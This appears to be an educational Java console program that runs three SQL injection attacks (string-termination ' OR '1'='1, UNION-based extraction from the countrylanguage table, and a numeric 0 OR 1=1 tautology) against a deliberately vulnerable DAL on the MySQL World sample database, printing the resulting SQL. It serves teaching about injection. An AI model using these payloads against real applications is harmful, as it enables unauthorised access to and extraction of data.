import java.util.List;

/**
 * SQLInjectionDemo — Console application that demonstrates SQL Injection attacks
 * against the intentionally vulnerable WorldDatabaseDAL class.
 *
 * ⚠️  EDUCATIONAL PURPOSES ONLY ⚠️
 * Run this ONLY against a local MySQL World database that you own.
 * Never test injection attacks against systems you do not have permission to access.
 *
 * Compile:
 *   javac -cp .:mysql-connector-j-9.x.x.jar WorldDatabaseDAL.java SQLInjectionDemo.java
 *
 * Run:
 *   java  -cp .:mysql-connector-j-9.x.x.jar SQLInjectionDemo
 */
public class SQLInjectionDemo {

    // The vulnerable DAL we are attacking
    private static final WorldDatabaseDAL dal = new WorldDatabaseDAL();

    public static void main(String[] args) {

        printBanner();

        // ── ATTACK 1 ──────────────────────────────────────────────────────────
        // Classic string-termination injection in a WHERE clause
        demonstrateAttack1_stringTermination();

        // ── ATTACK 2 ──────────────────────────────────────────────────────────
        // UNION-based injection through a LIKE clause to steal data from
        // a completely different table
        demonstrateAttack2_unionInjection();

        // ── ATTACK 3 ──────────────────────────────────────────────────────────
        // Tautology / always-true injection against a numeric column
        // (simulates the classic "1=1" authentication bypass)
        demonstrateAttack3_tautologyBypass();

        System.out.println("\n═══════════════════════════════════════════════════");
        System.out.println("  Demo complete. Review the [DAL] log lines above");
        System.out.println("  to see the exact SQL that was sent to MySQL.");
        System.out.println("═══════════════════════════════════════════════════\n");
    }

    // =========================================================================
    //  ATTACK 1 — String termination in getCitiesByCountry()
    //
    //  Legitimate call: getCitiesByCountry("USA")
    //    → SELECT Name, District, Population FROM city WHERE CountryCode = 'USA'
    //
    //  Injected call:   getCitiesByCountry("' OR '1'='1")
    //    → SELECT Name, District, Population FROM city WHERE CountryCode = '' OR '1'='1'
    //
    //  Because '1'='1' is always true, the WHERE clause is bypassed and
    //  EVERY row in the city table is returned – 4,079 cities instead of the
    //  intended subset.
    //
    //  The attacker closed the string literal with a single quote, injected a
    //  boolean OR condition, then "re-opened" the trailing quote the DAL adds
    //  so the final SQL remains syntactically valid.
    // =========================================================================
    private static void demonstrateAttack1_stringTermination() {
        printSectionHeader("ATTACK 1 — String Termination (Always-True WHERE)");

        // Step A: show what a legitimate query looks like
        System.out.println("Step A: Legitimate query for country code 'USA'");
        List<String[]> legit = dal.getCitiesByCountry("USA");
        System.out.printf("  Result: %d cities returned%n%n", legit.size());
        printCityTable(legit, 5);  // show first 5 rows

        // Step B: inject the payload
        // The payload closes the string, adds OR '1'='1, and the trailing
        // quote in the original SQL closes the injected literal cleanly.
        String payload = "' OR '1'='1";

        System.out.println("\nStep B: Injected payload  →  " + payload);
        System.out.println("  Resulting SQL sent to MySQL:");
        System.out.println("    SELECT Name, District, Population FROM city");
        System.out.println("    WHERE CountryCode = '" + payload + "'");
        System.out.println("  (The WHERE clause is now always true – every row is returned)");

        List<String[]> injected = dal.getCitiesByCountry(payload);
        System.out.printf("%n  ATTACK SUCCEEDED — %d rows returned (all cities in the table)%n",
                          injected.size());
    }

    // =========================================================================
    //  ATTACK 2 — UNION injection in searchCountries()
    //
    //  Legitimate call: searchCountries("land")
    //    → SELECT Code, Name, Continent, Population FROM country WHERE Name LIKE '%land%'
    //
    //  Injected payload:  "x%' UNION SELECT Language, CountryCode, IsOfficial, Percentage FROM countrylanguage -- "
    //
    //  Resulting SQL:
    //    SELECT Code, Name, Continent, Population
    //    FROM country
    //    WHERE Name LIKE '%x%'
    //    UNION
    //    SELECT Language, CountryCode, IsOfficial, Percentage
    //    FROM countrylanguage
    //    -- '    ← the trailing quote from the DAL is commented out
    //
    //  The UNION appends every row from countrylanguage (984 rows) to the
    //  result set. The attacker must match the number of columns (4) and use
    //  compatible data types.
    //
    //  The double-dash (--) is the MySQL single-line comment marker; it
    //  discards the closing quote that the DAL appends, preventing a syntax error.
    // =========================================================================
    private static void demonstrateAttack2_unionInjection() {
        printSectionHeader("ATTACK 2 — UNION Injection (Data Exfiltration)");

        System.out.println("Step A: Legitimate search for countries containing 'land'");
        List<String[]> legit = dal.searchCountries("land");
        System.out.printf("  Result: %d countries returned%n%n", legit.size());
        printGenericTable(legit, new String[]{"Code","Name","Continent","Population"}, 5);

        // The UNION needs 4 columns to match the original SELECT.
        // countrylanguage columns: Language, CountryCode, IsOfficial, Percentage
        // The -- comment swallows the trailing quote the DAL appends.
        String payload = "x%' UNION SELECT Language, CountryCode, IsOfficial, Percentage " +
                         "FROM countrylanguage -- ";

        System.out.println("\nStep B: Injected UNION payload:");
        System.out.println("  " + payload);
        System.out.println("\n  The injected SQL becomes:");
        System.out.println("    SELECT Code, Name, Continent, Population FROM country WHERE Name LIKE '%x%'");
        System.out.println("    UNION");
        System.out.println("    SELECT Language, CountryCode, IsOfficial, Percentage FROM countrylanguage");
        System.out.println("    -- '   ← trailing quote neutralised by SQL comment");

        List<String[]> injected = dal.searchCountries(payload);
        System.out.printf("%n  ATTACK SUCCEEDED — %d rows returned.%n", injected.size());
        System.out.println("  First 5 rows of exfiltrated countrylanguage data:");
        printGenericTable(injected, new String[]{"Language","CountryCode","IsOfficial","Percentage"}, 5);
    }

    // =========================================================================
    //  ATTACK 3 — Tautology / always-true bypass against a numeric column
    //             in getCountriesAbovePopulation()
    //
    //  Legitimate call: getCountriesAbovePopulation("50000000")
    //    → SELECT Code, Name, Population, GNP FROM country WHERE Population > 50000000
    //
    //  Injected payload:  "0 OR 1=1"
    //    → SELECT Code, Name, Population, GNP FROM country WHERE Population > 0 OR 1=1
    //
    //  Because 1=1 is always true, the WHERE clause becomes unconditionally
    //  true and every row in the country table is returned.
    //
    //  This pattern is the numeric equivalent of the classic authentication
    //  bypass:  username = admin' --   password = anything
    //  where the injected comment eliminates the password check.
    //
    //  Note: there are NO surrounding quotes here because the column is
    //  numeric. The attacker does not need to close a string literal – they
    //  just append valid SQL directly after the number.
    // =========================================================================
    private static void demonstrateAttack3_tautologyBypass() {
        printSectionHeader("ATTACK 3 — Numeric Tautology Bypass (Always-True OR)");

        System.out.println("Step A: Legitimate query for population > 50,000,000");
        List<String[]> legit = dal.getCountriesAbovePopulation("50000000");
        System.out.printf("  Result: %d countries returned%n%n", legit.size());
        printGenericTable(legit, new String[]{"Code","Name","Population","GNP"}, 5);

        // No quotes needed – this is a numeric context.
        // The injected OR 1=1 makes the entire WHERE predicate always true.
        String payload = "0 OR 1=1";

        System.out.println("\nStep B: Injected tautology payload  →  " + payload);
        System.out.println("  Resulting SQL sent to MySQL:");
        System.out.println("    SELECT Code, Name, Population, GNP FROM country WHERE Population > " + payload);
        System.out.println("  (1=1 is always true, so every country is returned regardless of population)");

        List<String[]> injected = dal.getCountriesAbovePopulation(payload);
        System.out.printf("%n  ATTACK SUCCEEDED — %d rows returned (entire country table).%n",
                          injected.size());
        System.out.println("  First 5 rows:");
        printGenericTable(injected, new String[]{"Code","Name","Population","GNP"}, 5);
    }

    // =========================================================================
    //  Formatting helpers
    // =========================================================================

    private static void printBanner() {
        System.out.println();
        System.out.println("╔═══════════════════════════════════════════════════════════╗");
        System.out.println("║        SQL INJECTION DEMO - MySQL World Database          ║");
        System.out.println("║                 EDUCATIONAL PURPOSES ONLY                 ║");
        System.out.println("╚═══════════════════════════════════════════════════════════╝");
        System.out.println();
        System.out.println("This program demonstrates three classic SQL injection techniques");
        System.out.println("against a deliberately vulnerable Java DAL class.");
        System.out.println("Each attack prints the exact SQL that reaches the database.");
        System.out.println();
    }

    private static void printSectionHeader(String title) {
        System.out.println("\n╔═══════════════════════════════════════════════════════════╗");
        System.out.printf ("║  %-57s║%n", title);
        System.out.println("╚═══════════════════════════════════════════════════════════╝\n");
    }

    /** Print up to maxRows rows from a city result set. */
    private static void printCityTable(List<String[]> rows, int maxRows) {
        System.out.printf("  %-30s %-20s %12s%n", "City", "District", "Population");
        System.out.println("  " + "─".repeat(64));
        int count = 0;
        for (String[] row : rows) {
            if (count++ >= maxRows) { System.out.println("  ... (truncated)"); break; }
            System.out.printf("  %-30s %-20s %12s%n", row[0], row[1], row[2]);
        }
    }

    /** Generic table printer. headers.length must equal row[i].length. */
    private static void printGenericTable(List<String[]> rows, String[] headers, int maxRows) {
        StringBuilder fmt = new StringBuilder("  ");
        for (String _ : headers) fmt.append("%-22s");
        fmt.append("%n");
        System.out.printf(fmt.toString(), (Object[]) headers);
        System.out.println("  " + "─".repeat(headers.length * 22));
        int count = 0;
        for (String[] row : rows) {
            if (count++ >= maxRows) { System.out.println("  ... (truncated)"); break; }
            // pad / truncate each cell to 22 chars for alignment
            String[] display = new String[row.length];
            for (int i = 0; i < row.length; i++) {
                String cell = row[i] == null ? "NULL" : row[i];
                display[i] = cell.length() > 20 ? cell.substring(0, 18) + ".." : cell;
            }
            System.out.printf(fmt.toString(), (Object[]) display);
        }
    }
}
